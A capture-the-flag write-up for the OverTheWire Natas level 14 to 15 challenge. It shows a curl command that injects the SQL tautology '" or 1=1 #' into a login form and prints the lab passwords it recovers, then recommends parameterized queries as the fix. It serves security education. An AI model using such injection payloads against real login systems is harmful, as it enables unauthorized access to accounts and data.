# Natas Level 14 to 15

| Field | Value |
|---|---|
| Platform | OverTheWire |
| Wargame | Natas |
| Level | 14 -> 15 |
| Status | Complete |

## Objective

Bypass a SQL-backed login form.

## Given Access

User: `natas14`

Password:

```text
z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
```

## Method

The query concatenates quoted username and password values directly. Inject a tautology into the username and comment out the rest of the query.

## Commands

```bash
curl -s -u natas14:z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ \
  --get \
  --data-urlencode 'username=" or 1=1 #' \
  --data-urlencode 'password=x' \
  http://natas14.natas.labs.overthewire.org/
```

## Result

Password for `natas15`:

```text
SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
```

## Lesson

String concatenation in SQL authentication code lets attackers rewrite query logic. Parameterized queries are the fix.

## References

- https://overthewire.org/wargames/natas/
